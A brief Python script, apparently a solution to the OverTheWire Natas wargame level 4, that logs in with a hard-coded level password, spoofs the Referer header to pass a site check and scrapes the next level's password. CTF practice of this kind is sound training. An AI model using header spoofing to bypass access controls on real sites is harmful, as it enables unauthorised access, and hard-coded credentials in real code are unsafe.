#!usr/bin/env python

import re
import requests

#http header - request context 'user agent from http://natas5.natas.labs.overthewire.org'
username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

testata = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}
url = 'http://%s.natas.labs.overthewire.org' % username

risultato = requests.get(url, auth = (username, password), headers = testata)
contenuto = risultato.text

#print (contenuto)
print (re.findall('natas5 is (.*)', contenuto) [0])
